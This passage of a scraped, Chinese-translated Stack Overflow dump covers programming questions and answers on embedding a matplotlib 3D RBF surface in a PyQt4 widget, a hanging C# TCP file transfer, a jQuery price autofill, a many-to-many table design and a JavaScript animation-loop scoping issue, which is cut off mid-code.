            optim_plotting_frame.setWindowTitle(QtGui.QApplication.translate("optim_plotting_frame", "Plotting", None, QtGui.QApplication.UnicodeUTF8))
            self.verticalLayout_2 = QtGui.QVBoxLayout(optim_plotting_frame)
            self.verticalLayout_2.setObjectName(_fromUtf8("verticalLayout_2"))
            self.horizontalLayout = QtGui.QHBoxLayout()
            self.horizontalLayout.setObjectName(_fromUtf8("horizontalLayout"))
            self.verticalLayout = QtGui.QVBoxLayout()
            self.verticalLayout.setSizeConstraint(QtGui.QLayout.SetMinimumSize)
            self.verticalLayout.setObjectName(_fromUtf8("verticalLayout"))
            self.label_function = QtGui.QLabel(optim_plotting_frame)
            self.label_function.setMinimumSize(QtCore.QSize(111, 16))
            self.label_function.setMaximumSize(QtCore.QSize(16777215, 16777215))
            self.label_function.setToolTip(QtGui.QApplication.translate("optim_plotting_frame", "defines radial basis function for interpolation", None, QtGui.QApplication.UnicodeUTF8))
            self.label_function.setText(QtGui.QApplication.translate("optim_plotting_frame", "\n"
    "\n"
    "p, li { white-space: pre-wrap; }\n"
    "\n"
    "Interpolation function:`", None, QtGui.QApplication.UnicodeUTF8))
            self.label_function.setObjectName(_fromUtf8("label_function"))
            self.verticalLayout.addWidget(self.label_function)
            self.cmb_function = QtGui.QComboBox(optim_plotting_frame)
            self.cmb_function.setMinimumSize(QtCore.QSize(111, 22))
            self.cmb_function.setMaximumSize(QtCore.QSize(16777215, 16777215))
            self.cmb_function.setToolTip(QtGui.QApplication.translate("optim_plotting_frame", "defines radial basis function for interpolation", None, QtGui.QApplication.UnicodeUTF8))
            self.cmb_function.setObjectName(_fromUtf8("cmb_function"))
            self.cmb_function.addItem(_fromUtf8(""))
            self.cmb_function.setItemText(0, QtGui.QApplication.translate("optim_plotting_frame", "multiquadric", None, QtGui.QApplication.UnicodeUTF8))
            self.cmb_function.addItem(_fromUtf8(""))
            self.cmb_function.setItemText(1, QtGui.QApplication.translate("optim_plotting_frame", "inverse", None, QtGui.QApplication.UnicodeUTF8))
            self.cmb_function.addItem(_fromUtf8(""))
            self.cmb_function.setItemText(2, QtGui.QApplication.translate("optim_plotting_frame", "gaussian", None, QtGui.QApplication.UnicodeUTF8))
            self.cmb_function.addItem(_fromUtf8(""))
            self.cmb_function.setItemText(3, QtGui.QApplication.translate("optim_plotting_frame", "linear", None, QtGui.QApplication.UnicodeUTF8))
            self.cmb_function.addItem(_fromUtf8(""))
            self.cmb_function.setItemText(4, QtGui.QApplication.translate("optim_plotting_frame", "cubic", None, QtGui.QApplication.UnicodeUTF8))
            self.cmb_function.addItem(_fromUtf8(""))
            self.cmb_function.setItemText(5, QtGui.QApplication.translate("optim_plotting_frame", "quintic", None, QtGui.QApplication.UnicodeUTF8))
            self.cmb_function.addItem(_fromUtf8(""))
            self.cmb_function.setItemText(6, QtGui.QApplication.translate("optim_plotting_frame", "thin_plate", None, QtGui.QApplication.UnicodeUTF8))
            self.verticalLayout.addWidget(self.cmb_function)
            self.label_alpha = QtGui.QLabel(optim_plotting_frame)
            self.label_alpha.setMinimumSize(QtCore.QSize(111, 16))
            self.label_alpha.setMaximumSize(QtCore.QSize(16777215, 16777215))
            self.label_alpha.setToolTip(QtGui.QApplication.translate("optim_plotting_frame", "Defines transparency: 0 - transparent, 1 - not transparent", None, QtGui.QApplication.UnicodeUTF8))
            self.label_alpha.setText(QtGui.QApplication.translate("optim_plotting_frame", "Alpha:", None, QtGui.QApplication.UnicodeUTF8))
            self.label_alpha.setObjectName(_fromUtf8("label_alpha"))
            self.verticalLayout.addWidget(self.label_alpha)
            self.dspb_alpha = QtGui.QDoubleSpinBox(optim_plotting_frame)
            self.dspb_alpha.setMinimumSize(QtCore.QSize(111, 0))
            self.dspb_alpha.setMaximumSize(QtCore.QSize(16777215, 16777215))
            self.dspb_alpha.setToolTip(QtGui.QApplication.translate("optim_plotting_frame", "Defines transparency: 0 - transparent, 1 - not transparent", None, QtGui.QApplication.UnicodeUTF8))
            self.dspb_alpha.setMaximum(1.0)
            self.dspb_alpha.setSingleStep(0.1)
            self.dspb_alpha.setProperty("value", 0.7)
            self.dspb_alpha.setObjectName(_fromUtf8("dspb_alpha"))
            self.verticalLayout.addWidget(self.dspb_alpha)
            self.label_smooth = QtGui.QLabel(optim_plotting_frame)
            self.label_smooth.setMinimumSize(QtCore.QSize(111, 16))
            self.label_smooth.setMaximumSize(QtCore.QSize(16777215, 16777215))
            self.label_smooth.setToolTip(QtGui.QApplication.translate("optim_plotting_frame", "Smoothness of the approximation", None, QtGui.QApplication.UnicodeUTF8))
            self.label_smooth.setText(QtGui.QApplication.translate("optim_plotting_frame", "Smoothness:", None, QtGui.QApplication.UnicodeUTF8))
            self.label_smooth.setObjectName(_fromUtf8("label_smooth"))
            self.verticalLayout.addWidget(self.label_smooth)
            self.dspb_smooth = QtGui.QDoubleSpinBox(optim_plotting_frame)
            self.dspb_smooth.setMinimumSize(QtCore.QSize(111, 0))
            self.dspb_smooth.setMaximumSize(QtCore.QSize(16777215, 16777215))
            self.dspb_smooth.setToolTip(QtGui.QApplication.translate("optim_plotting_frame", "Smoothness of the approximation", None, QtGui.QApplication.UnicodeUTF8))
            self.dspb_smooth.setSingleStep(0.1)
            self.dspb_smooth.setObjectName(_fromUtf8("dspb_smooth"))
            self.verticalLayout.addWidget(self.dspb_smooth)
            self.chb_normxy = QtGui.QCheckBox(optim_plotting_frame)
            self.chb_normxy.setText(QtGui.QApplication.translate("optim_plotting_frame", "normalized x,y ticks", None, QtGui.QApplication.UnicodeUTF8))
            self.chb_normxy.setChecked(True)
            self.chb_normxy.setObjectName(_fromUtf8("chb_normxy"))
            self.verticalLayout.addWidget(self.chb_normxy)
            spacerItem = QtGui.QSpacerItem(20, 40, QtGui.QSizePolicy.Minimum, QtGui.QSizePolicy.Expanding)
            self.verticalLayout.addItem(spacerItem)
            self.horizontalLayout.addLayout(self.verticalLayout)
            self.widget = QtGui.QWidget(optim_plotting_frame)
            self.widget.setFocusPolicy(QtCore.Qt.StrongFocus)
            self.widget.setObjectName(_fromUtf8("widget"))
            self.horizontalLayout.addWidget(self.widget)
            self.horizontalLayout.setStretch(1, 10)
            self.verticalLayout_2.addLayout(self.horizontalLayout)

            self.retranslateUi(optim_plotting_frame)
            QtCore.QMetaObject.connectSlotsByName(optim_plotting_frame)

        def retranslateUi(self, optim_plotting_frame):
            pass` 

和 main.py（下面的代码）中的类，它继承生成的小部件并在其上绘制表面（将带有绘图表面的 FigureCanvasQTAgg 添加到小部件）

```
 import sys
    from PyQt4 import QtGui, QtCore
    from PyQt4.QtGui import QApplication, QDialog

    import numpy as np
    from scipy.interpolate import Rbf

    from optim_plotting_frame import Ui_optim_plotting_frame

    from matplotlib.backends.backend_qt4agg import FigureCanvasQTAgg as FigureCanvas
    from matplotlib.backends.backend_qt4agg import NavigationToolbar2QTAgg as NavigationToolbar
    from mpl_toolkits.mplot3d import Axes3D
    from matplotlib.figure import Figure
    from matplotlib import cm

    class optim_plotting_frame(QtGui.QWidget):
        "Plotting settings widget"
        def __init__(self, x, y, z, minx=None, maxx=None, miny=None, maxy=None, xname=None, yname=None, zname=None):
            super(optim_plotting_frame, self).__init__()

            self.ui = Ui_optim_plotting_frame()
            self.ui.setupUi(self)

            """
            Parameters:
                x: numpy.ndarray
                    set of first parameter data (first coordinate)

                y: numpy.ndarray
                    set of second parameter data (second coordinate)

                z: numpy.ndarray
                    set of data corresponding to x and y (result)

                alpha: float, optional
                    Number between 0 and 1 that defines transparency: 0 - transparent,
                    1 - not transparent.

                function: string, optional
                    defines radial basis function for interpolation, by default - 'multiquadric'

                    'multiquadric': sqrt((r/self.epsilon)**2 + 1)
                    'inverse':      1.0/sqrt((r/self.epsilon)**2 + 1)
                    'gaussian':     exp(-(r/self.epsilon)**2)
                    'linear':       r
                    'cubic':        r**3
                    'quintic':      r**5
                    'thin_plate':   r**2 * log(r)

                smooth: float, optional
                    Values greater than zero increase the smoothness of the approximation.
                    0 is for interpolation (default), the function will always go through
                    the nodal points in this case.

                minx: float, opyional
                    minimum possible value of x

                maxx: float, opyional
                    maximum possible value of x

                miny: float, opyional
                    minimum possible value of y

                maxy: float, opyional
                    maximum possible value of y

                xname: string, optional
                    name of x parameter

                yname: string, optional
                    name of y parameter

                zname: string, optional
                    name of z parameter (objective function)
            """
            #==========================Data validation=============================
            if any((not isinstance(x, np.ndarray),
                    not isinstance(y, np.ndarray),
                    not isinstance(z, np.ndarray))):
                print "Error: x, y, z must be of numpy.ndarray type."
                return None

            if x.size != y.size != z.size:
                print "Error: x, y, z must be of equal size."
                return None

            if not isinstance(minx, (float, int)):
                minx = x.min()

            if not isinstance(maxx, (float, int)):
                maxx = x.max()

            if not isinstance(miny, (float, int)):
                miny = y.min()

            if not isinstance(maxy, (float, int)):
                maxy = y.max()

            if minx > maxx:
                tmp = minx
                minx = maxx
                maxx = tmp

            if miny > maxy:
                tmp = miny
                miny = maxy
                maxy = tmp

            if not isinstance(xname, str):
                xname = ""

            if not isinstance(yname, str):
                yname = ""

            if not isinstance(zname, str):
                zname = ""
            #======================================================================

            self.initialized = False

            self.x = x
            self.y = y
            self.z = z
            self.minx = minx
            self.maxx = maxx
            self.miny = miny
            self.maxy = maxy
            self.xname = xname
            self.yname = yname
            self.zname = zname

            # map to [0,1] range
            self.x = (x - minx) / maxx
            self.y = (y - miny) / maxy

            # update alpha, function, smooth values from widget
            self.alpha = self.ui.dspb_alpha.value()
            self.function = self.ui.cmb_function.currentText()
            self.smooth = self.ui.dspb_smooth.value()

            self.create_main_frame()

            self.initialized = True
            self.plot()

        def updateVals(self):
            """
            update alpha, function, smooth values from widget and parameters
            """
            self.alpha = self.ui.dspb_alpha.value()
            self.function = self.ui.cmb_function.currentText()
            self.smooth = self.ui.dspb_smooth.value()

        def plot(self):
            self.updateVals()
            self.axes.clear()

            try:
                # getting coordinate matrices from two coordinate vectors.
                tx = np.linspace(self.x.min(), self.x.max(), 100)
                ty = np.linspace(self.y.min(), self.y.max(), 100)
                XI, YI = np.meshgrid(tx, ty)
                # interpolating by radial basis function
                rbf = Rbf(self.x, self.y, self.z, function=str(self.function), smooth=self.smooth)
                # getting interpolation function results corresponding to (XI, YI)
                ZI = rbf(XI, YI)
                # plotting interpolaed surface
                self.axes.plot_surface(XI, YI, ZI, cmap=cm.jet, alpha=self.alpha)
            except Exception as e:
                print "Error occured! original message: " + e.message

            # plotting initial points
            self.axes.scatter(self.x, self.y, self.z)

            self.axes.set_xlim(self.x.min(), self.x.max())
            self.axes.set_ylim(self.y.min(), self.y.max())

            self.axes.set_title('RBF interpolation ' + self.function)
            if not self.ui.chb_normxy.isChecked():
                # setting ticks labels on the x line
                self.axes.set_xticklabels((self.axes.get_xticks() * self.maxx + self.minx).round(1))
                # setting ticks labels on the y line
                self.axes.set_yticklabels((self.axes.get_yticks() * self.maxy + self.miny).round(1))
            self.axes.set_xlabel(self.xname)
            self.axes.set_ylabel(self.yname)
            self.axes.set_zlabel(self.zname)

            ## adding colorbar
            #m = cm.ScalarMappable(cmap=cm.jet)
            #m.set_array(ZI)
            #self.axes.figure.colorbar(m)

            self.canvas.draw()

        def create_main_frame(self):
            # Create the mpl Figure and FigCanvas objects. 5x4 inches, 100 dots-per-inch
            self.dpi = 100
            self.fig = Figure((8.0, 4.0), dpi=self.dpi)
            # setting diagram background
            self.fig.patch.set_facecolor('white')
            self.canvas = FigureCanvas(self.fig)
            self.canvas.setParent(self.ui.widget)

            self.axes = Axes3D(self.fig)

            # Create the navigation toolbar, tied to the canvas
            self.mpl_toolbar = NavigationToolbar(self.canvas, self.ui.widget, coordinates=False)

            # connecting signals
            self.ui.cmb_function.currentIndexChanged.connect(self.plot)
            self.ui.dspb_alpha.valueChanged.connect(self.plot)
            self.ui.dspb_smooth.valueChanged.connect(self.plot)
            self.ui.chb_normxy.stateChanged.connect(self.plot)

            # Vertical layout for canvas and toolbar
            vbox = QtGui.QVBoxLayout()
            vbox.addWidget(self.canvas)
            vbox.addWidget(self.mpl_toolbar)

            self.ui.widget.setLayout(vbox)
            self.ui.widget.setFocus(QtCore.Qt.MouseFocusReason)

    # Create a Qt application
    app = QApplication(sys.argv)
    window = QDialog()

    opf = optim_plotting_frame(x = np.array([  100.,   300.,   500.,   700.,   900.,  1000.,   100.,   300., 500.,   700.,   900.,  1000.,   100.,   300.,   500.,   700., 900.,  1000.,   100.,   300.,   500.,   700.,   900.,  1000., 100.,   300.,   500.,   700.,   900.,  1000.,   100.,   300., 500.,   700.,   900.,  1000.]),
                               y = np.array([  100.,   100.,   100.,   100.,   100.,   100.,   300.,   300., 300.,   300.,   300.,   300.,   500.,   500.,   500.,   500., 500.,   500.,   700.,   700.,   700.,   700.,   700.,   700., 900.,   900.,   900.,   900.,   900.,   900.,  1000.,  1000., 1000.,  1000.,  1000.,  1000.]),
                               z = np.array([374712.60107421875, 526249.09765625, 500842.119140625, 391724.2041015625, 329192.123046875, 298277.92041015625, 526249.259765625, 601555.873046875, 598078.173828125, 529956.01953125, 502884.986328125, 485526.5244140625, 500841.181640625, 598078.400390625, 587555.86328125, 530815.837890625, 495623.544921875, 474902.572265625, 391725.0869140625, 529956.8408203125, 530815.6259765625, 447601.33081054688, 402540.9443359375, 385187.92944335938, 329192.2392578125, 502885.27734375, 495623.6396484375, 402541.17431640625, 365774.16870117188, 343962.6298828125, 298277.88305664062, 485526.775390625, 474903.0673828125, 385187.75439453125, 343962.728515625, 326735.05065917969]),
                               minx = 100,
                               maxx = 1000,
                               miny = 100,
                               maxy = 1000,
                               xname = 'width',
                               yname = 'height',
                               zname = 'WOPT')
    opf.show()
    sys.exit(app.exec_()) 
```

并且有两个问题：1）轴网格与我的表面重叠。2）sirface的旋转和缩放很慢。

当我不使用 QWidget 时，一切正常（下面的示例），但我应该在我的应用程序中绘制这个表面，我需要在 QWidget 上进行。因此，任何解决此问题的建议将不胜感激。

```
 import numpy as np
    from scipy.interpolate import Rbf
    import matplotlib.pyplot as plt
    import matplotlib.colors as colors
    from matplotlib import cm
    from mpl_toolkits.mplot3d import Axes3D

    def plotSurface(x, y, z, alpha=None, function=None, smooth=None,
                    minx=None, maxx=None, miny=None, maxy=None, xname=None, yname=None, zname=None):
        """
        This function will create new window with plotted surface on it.

        Parameters:
            x: numpy.ndarray
                set of first parameter data (first coordinate)

            y: numpy.ndarray
                set of second parameter data (second coordinate)

            z: numpy.ndarray
                set of data corresponding to x and y (result)

            alpha: float, optional
                Number between 0 and 1 that defines transparency: 0 - transparent,
                1 - not transparent.

            function: string, optional
                defines radial basis function for interpolation, by default - 'multiquadric'

                'multiquadric': sqrt((r/self.epsilon)**2 + 1)
                'inverse':      1.0/sqrt((r/self.epsilon)**2 + 1)
                'gaussian':     exp(-(r/self.epsilon)**2)
                'linear':       r
                'cubic':        r**3
                'quintic':      r**5
                'thin_plate':   r**2 * log(r)

            smooth: float, optional
                Values greater than zero increase the smoothness of the approximation.
                0 is for interpolation (default), the function will always go through
                the nodal points in this case.

            minx: float, opyional
                minimum possible value of x

            maxx: float, opyional
                maximum possible value of x

            miny: float, opyional
                minimum possible value of y

            maxy: float, opyional
                maximum possible value of y

            xname: string, optional
                name of x parameter

            yname: string, optional
                name of y parameter

            zname: string, optional
                name of z parameter (objective function)
        """
        #==========================Data validation=================================
        if any((not isinstance(x, np.ndarray),
                not isinstance(y, np.ndarray),
                not isinstance(z, np.ndarray))):
            print "Error: x, y, z must be of numpy.ndarray type."
            return None

        if x.size != y.size != z.size:
            print "Error: x, y, z must be of equal size."
            return None

        if not isinstance(alpha, (float, int)):
            alpha = 0.7

        if not isinstance(function, str):
            try:
                function = str(function)
            except:
                function = 'multiquadric'

        if not any((function == 'multiquadric',
                    function == 'inverse',
                    function == 'gaussian',
                    function == 'linear',
                    function == 'cubic',
                    function == 'quintic',
                    function == 'thin_plate')):
            function = 'multiquadric'

        if smooth is None:
            smooth = 0

        if not isinstance(minx, (float, int)):
            minx = x.min()

        if not isinstance(maxx, (float, int)):
            maxx = x.max()

        if not isinstance(miny, (float, int)):
            miny = y.min()

        if not isinstance(maxy, (float, int)):
            maxy = y.max()

        if minx > maxx:
            tmp = minx
            minx = maxx
            maxx = tmp

        if miny > maxy:
            tmp = miny
            miny = maxy
            maxy = tmp

        if not isinstance(xname, str):
            xname = ""

        if not isinstance(yname, str):
            yname = ""

        if not isinstance(zname, str):
            zname = ""
        #==========================================================================

        fig = plt.figure()
        # setting diagram background
        fig.patch.set_facecolor('white')
        ax = Axes3D(fig)

        # map to [0,1] range
        x = (x - minx) / maxx
        y = (y - miny) / maxy

        try:
            # getting coordinate matrices from two coordinate vectors.
            tx = np.linspace(x.min(), x.max(), 100)
            ty = np.linspace(y.min(), y.max(), 100)
            XI, YI = np.meshgrid(tx, ty)
            # interpolating by radial basis function
            rbf = Rbf(x, y, z, function=function, smooth=smooth)
            # getting interpolation function results corresponding to (XI, YI)
            ZI = rbf(XI, YI)
            # plotting interpolaed surface
            ax.plot_surface(XI, YI, ZI, cmap=cm.jet, alpha=alpha)
        except Exception as e:
            print "Error occured! original message: " + e.message

        # plotting initial points
        ax.scatter(x, y, z)

        ax.set_xlim(x.min(), x.max())
        ax.set_ylim(y.min(), y.max())

        ax.set_title('RBF interpolation ' + function)
        # setting ticks positions on the x line
        ax.set_xticklabels((ax.get_xticks() * maxx + minx).round(1))
        # setting ticks labelson the y line
        ax.set_yticklabels((ax.get_yticks() * maxy + miny).round(1))
        ax.set_xlabel(xname)
        ax.set_ylabel(yname)
        ax.set_zlabel(zname)

        # adding colorbar
        m = cm.ScalarMappable(cmap=cm.jet)
        m.set_array(ZI)
        ax.figure.colorbar(m)

        # showing window with diagram
        plt.show()

    plotSurface(x = np.array([  100.,   300.,   500.,   700.,   900.,  1000.,   100.,   300., 500.,   700.,   900.,  1000.,   100.,   300.,   500.,   700., 900.,  1000.,   100.,   300.,   500.,   700.,   900.,  1000., 100.,   300.,   500.,   700.,   900.,  1000.,   100.,   300., 500.,   700.,   900.,  1000.]),
                y = np.array([  100.,   100.,   100.,   100.,   100.,   100.,   300.,   300., 300.,   300.,   300.,   300.,   500.,   500.,   500.,   500., 500.,   500.,   700.,   700.,   700.,   700.,   700.,   700., 900.,   900.,   900.,   900.,   900.,   900.,  1000.,  1000., 1000.,  1000.,  1000.,  1000.]),
                z = np.array([374712.60107421875, 526249.09765625, 500842.119140625, 391724.2041015625, 329192.123046875, 298277.92041015625, 526249.259765625, 601555.873046875, 598078.173828125, 529956.01953125, 502884.986328125, 485526.5244140625, 500841.181640625, 598078.400390625, 587555.86328125, 530815.837890625, 495623.544921875, 474902.572265625, 391725.0869140625, 529956.8408203125, 530815.6259765625, 447601.33081054688, 402540.9443359375, 385187.92944335938, 329192.2392578125, 502885.27734375, 495623.6396484375, 402541.17431640625, 365774.16870117188, 343962.6298828125, 298277.88305664062, 485526.775390625, 474903.0673828125, 385187.75439453125, 343962.728515625, 326735.05065917969]),
                alpha = 0.7,
                function = 'multiquadric',
                smooth = 0.0,
                minx = 100,
                maxx = 1000,
                miny = 100,
                maxy = 1000,
                xname = 'width',
                yname = 'height',
                zname = 'WOPT') 
```

            回答 #1

赞同：0

时间：2013-07-31T03:22:38.437

使用 matplotlib 旋转和缩放总是一个相当慢的操作，因为它需要再次渲染整个图形。

```

# c# - 通过 TCP 发送/接收文件

> ID：13524680
> 
> 赞同：1
> 
> 时间：2012-11-23T07:25:19.323
> 
> 标签：c#, file, tcp, send

> **可能重复：**
> [TcpClient 通过网络循环发送数据和接收数据，](https://stackoverflow.com/questions/3609280/tcpclient-send-data-and-receive-data-over-network)
> [直到 TcpClient 响应完全读取](https://stackoverflow.com/questions/8027664/loop-until-tcpclient-response-fully-read)

我正在尝试通过 TCP 将文件从服务器发送到客户端。

服务器端代码，发送文件：

```
NetworkStream netStream = client.GetStream();
FileStream fs = new FileStream("usb.exe",FileMode.Open, FileAccess.Read);
byte[] data = new byte[fs.Length];
fs.Read(data,0, data.Length);
fs.Flush();
fs.Close();

netStream.Write(data, 0, data.Length);
netStream.Flush(); 
```

客户端代码，接收文件：

```
FileStream str = new FileStream("usb.exe", FileMode.Create, FileAccess.Write);
byte[] data = new byte[1024];

while ((dataCitit = netStream.Read(data,0, data.Length)) > 0)
    {
         Thread.Sleep(25);
         Application.DoEvents();

         str.Write(data, 0, dataCitit);
         totalbytes += dataCitit;                      
    }
str.Close(); 
```

有人能指出我哪里弄错了吗？

该文件有 1036 kb，它只发送 1032 kb 然后卡住它不会退出客户端的 while 循环。

此外，如果我关闭服务器并快速打开它，它会发送最后一个字节并且文件会完全发送。（此文件完美打开）

我认为这是服务器端的问题，不是发送所有字节，而是为什么和在哪里......

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-23T07:31:38.190

好吧，这是您的服务器端代码中的一个问题：

```
fs.Read(data,0, data.Length); 
```

您忽略了`Read`. *永远不要*那样做。和`FileStream`你一起*可能*没问题，但我个人无论如何都不会相信它。如果您使用的是 .NET 4，则无论如何都不需要这样做 - 只需使用`Stream.CopyTo`.

在客户端代码上，您最大的初始问题是您在 UI 线程上执行所有这些操作。这是一个糟糕的主意——如果出现网络故障，UI 将冻结，因为`Read`呼叫被阻塞。

同样，只需使用`Stream.CopyTo`，但在后台线程中执行。

此外，在*所有*这些情况下，对流使用`using`语句，以便无论发生什么都可以干净地关闭它们。

这只是*一般*的卫生。现在，至于你为什么挂...

...您没有关闭服务器端的网络流。因此，您永远不会到达客户端流的*末尾。*如果只需要对单个文件使用连接，那么答案很简单：关闭服务器端的连接即可。

但是，如果您需要对多个文件使用相同的连接，那么您需要更多的协议——您需要某种方式来指示数据的结束。有三种常见的方法来做到这一点：

*   在数据本身之前写入数据的长度，然后在读取端，首先读取长度，然后读取那么多字节，如果流在您完成之前完成则失败。这要求您在开始写入之前知道要写入多少数据。
*   使用可以在读取端检测到的“数据结束”标记；这通常是一种痛苦，因为如果它出现在文本本身中，它需要转义标记。
*   第一种方法的变体，您一次写入一个以长度为前缀的块，然后写入一个零长度块以指示“数据结束”。这是非常灵活的，但如果第一种方法确实适合您，那么显然比第一种方法工作更多。

# php - 根据所选产品自动填充价格

> ID：13524682
> 
> 赞同：0
> 
> 时间：2012-11-23T07:25:41.490
> 
> 标签：php, jquery, codeigniter, autocomplete

我有一个包含数量产品和价格的表格。

```
<form action="" method="POST">
Quantity: <input type="text" name="quantity" id="quantity">
Products: <select name="product" id="product"><option value="1">Product 1</option><option value="2">Product 2</option></select>
Price: <input type="text" name="price" id="price">
<input type="submit" value="submit">
</form> 
```

我想从数据库中自动填充所选产品的价格。我试过警告

```
<script type="text/javascript">
$(document).ready(function() {
    $(function() {
        $( "#product" ).autocomplete({
            source: function(request, response) {
                $.ajax({ url: "<?php echo site_url('sales/price'); ?>",
                data: { term: $("#product").val()},
                type: "POST",
                success: function(data){
                    alert(data);
                }
            });
        },
        minLength: 1
        });
    });
});
</script> 
```

销售/价格页面返回产品 ID 的价格（90.00 或 80.00）。我试图将产品选择的值作为帖子传递并取回结果以设置价格值。任何帮助都感激不尽。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T07:32:56.673

```
<script type="text/javascript">
$(document).ready(function() {
    $("#product").change(function(){
        $.ajax({ 
            url: "<?php echo site_url('sales/price'); ?>",
            data: { product_id: $(this).val() },
            type: "POST",
            success: function(data){
                $('#price').val( data );
            }
        });
    })
});
</script> 
```

试试这个代码。

# php - 我想要一种方法来管理 2 个表之间的关系

> ID：13524683
> 
> 赞同：1
> 
> 时间：2012-11-23T07:25:41.913
> 
> 标签：php, mysql, sql, phpmyadmin

我有 2 张桌子。鼓手和鼓手类型。

```
DRUMMER_TYPE 
ID      TYPE
1       A1
2       A2
3       A3

DRUMMER
ID     NAME    TYPE
1      A       1
2      B       2
3      C       1 
```

我想要一种为鼓手添加更多类型的方法。我不想在鼓手表上添加新表并维护关系，因为已经完成了太多编码。有什么方法可以保持关系（不使用逗号分隔）？

对于逗号分隔，它看起来像这样（我不希望这样还有其他方法）：

```
DRUMMER
ID    NAME    TYPE
1     A       1,2,3  
2     B       2,3
3     C       1 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T07:29:43.983

是的，设计应该是：

```
Two tables :

1) Drummers     : id, name, type
2) Drummer_type : id, desc

The Drummers.type will be a reference to Drummer_type.id

Now IF you want to add more drummer's type, just insert a row in Drummer_type table 
```

如果您对此有任何疑问，请告诉我。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T07:30:43.167

您可以使用按位字段，更多信息：[http ://home.comcast.net/~tolkin.family/bitwise.htm](http://home.comcast.net/~tolkin.family/bitwise.htm)

例如，您可以以这种方式对您的三个 DRUMMER_TYPE 进行编码：

```
000 = Nothing
001 = A1
010 = A2
100 = A3 
```

这样，如果您可以为 DRUMMER 保存 DRUMMER_TYPE A1 和 A3，则可以将值保存`101`在数据库中。该技术类似于权限在 Unix 系统上的工作方式。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-23T07:56:24.360

如果你有一个多对多的关系，那么你应该有第三个表来维护这种关系：

```
DrummerIs:  DrummerId, TypeId 
```

还有其他方法可以做到这一点（多列、连接值等），但它们都有严重的缺陷。几乎总是建议使用关系表来维护多对多关系，因为最终它是最容易实现和使用的。

# javascript - 使用 requestAnimLoop “调用”函数实例

> ID：13524687
> 
> 赞同：0
> 
> 时间：2012-11-23T07:25:55.533
> 
> 标签：javascript, oop, recursion

在我的 balls.start 函数中，我希望能够在 requestAnimFrame 中调用它。例如 requestAnimFrame(this.start) （不起作用，因为它在包装函数中）。目前它只能像我一样工作：`var Balls = new balls(context);`在上下文之外。

所有代码：http: [//jsfiddle.net/PRgTn/2/](http://jsfiddle.net/PRgTn/2/)

相关（ish）代码：

```
window.requestAnimFrame = (function () {
                return window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || window.oRequestAnimationFrame || window.msRequestAnimationFrame || function (callback) {
                    window.setTimeout(callback, 1000 / 60);
                };
            })();

var balls = function balls(context) {
                this.context = context,
                this.all_balls = [];
                this.add = function () {
                    var x = new ball(this.context);
                    this.all_balls.push(x);
                    return x;
                }
                this.start = function () {
                    (function animloop() {
                        requestAnimFrame(animloop);
                        var x = new Date().getTime() - (this.time || new Date().getTime());
                        this.time = new Date().getTime();
                        Balls.update(x);
                        Balls.collision(x);
                        Balls.frames();
                        Balls.redraw();
                    })();
                }
                this.frames = function () {
                var time = new Date().getTime();
                    if (!this.last_fps_time) this.last_fps_time = time;
                    if (!this.frames_since_last) this.frames_since_last = 0;
                    this.frames_since_last++;
                    if (time - this.last_fps_time >= 1000) {
                         this.frame_text = this.frames_since_last + " FPS";
                         this.frames_since_last = 0;
                         this.last_fps_time = time;
                    }
                }
                this.redraw = function () {
                    this.context.save();
                    this.context.setTransform(1, 0, 0, 1, 0, 0);
                    this.context.clearRect(0, 0, canvas.width, canvas.height);
                    this.context.restore();
                    this.each(function () {
                        this.draw();
                    });
                    this.context.fillStyle = '#000000';
                    this.context.font = "12px 'Open Sans'";
                    this.context.fillText(this.frame_text || this.frames_since_last + " FPS",5,17);
                }
                this.each = function (fn) {
                    for (var i = 0; i < this.all_balls.length; i++) {
                        fn.apply(this.all_balls[i]);
                    }
                }
                this.collision = function (t) {
                    Balls.each(function () {
                        var A = {}, B = {};
                        A = this;
                        Balls.each(function () {
                            B = this;
                            if ((A.y != B.y) || (A.x != B.x)) {
                                if (((a = Math.pow(A.x - B.x, 2)) + (b = Math.pow(A.y - B.y, 2))) <= (c = Math.pow(A.radius + B.radius, 2))) {
                                    //http://gamedev.tutsplus.com/tutorials/implementation/when-worlds-collide-simulating-circle-circle-collisions/
                                    var ax = (A.x_vel * (A.mass - B.mass) + (2 * B.mass * B.x_vel)) / (A.mass + B.mass);
                                    var ay = (A.y_vel * (A.mass - B.mass) + (2 * B.mass * B.y_vel)) / (A.mass + B.mass);
                                    B.x_vel = (B.x_vel * (B.mass - A.mass) + (2 * A.mass * A.x_vel)) / (A.mass + B.mass);
                                    B.y_vel = (B.y_vel * (B.mass - A.mass) + (2 * A.mass * A.y_vel)) / (A.mass + B.mass);
                                    A.x_vel = ax;
                                    A.y_vel = ay;
                                    A.x = A.x + (t * A.x_vel / 16);
                                    A.y = A.y + (t * A.y_vel / 16);
                                    B.x = B.x + (t * B.x_vel / 16);
                                    B.y = B.y + (t * B.y_vel / 16);
                                    //B.x = A.x+(B.x>A.x?1:-1)*Math.sqrt(c-b);
                                    //B.y = A.y+(B.y>A.y?1:-1)*Math.sqrt(c-a);
                                }
                            }
                        });
                    });
                }
                this.update = function (t) {
                    Balls.each(function () {
                        this.x += (t * this.x_vel / 16);
                        this.y += (t * this.y_vel / 16);
                        var t_x_vel = this.x_vel;
                        var t_y_vel = this.y_vel;
                        if (this.x >= this.context.canvas.width - this.radius && this.x_vel > 0) this.x_vel = -this.x_vel;
                        if (this.x <= this.radius && this.x_vel < 0) this.x_vel = -this.x_vel;
                        if (this.y >= this.context.canvas.height - this.radius && this.y_vel > 0) this.y_vel = -this.y_vel;
                        if (this.y <= this.radius && this.y_vel < 0) this.y_vel = -this.y_vel;
                        if (this.x_vel != t_x_vel) this.x += (t * this.x_vel / 16);
                        if (this.y_vel != t_y_vel) this.y += (t * this.y_vel / 16);
                    });
                }
            } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T09:33:00.393

您的代码没有理由属于该全局（可能是未初始化的）变量`Balls`。[`this`删除它，你可以很容易地用关键字](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Operators/this)替换它。

在您的功能中并非如此`start`，这是真的。`animloop`在全局上下文中执行，因此您需要解决此问题：

```
start = function() {
    var balls = this;
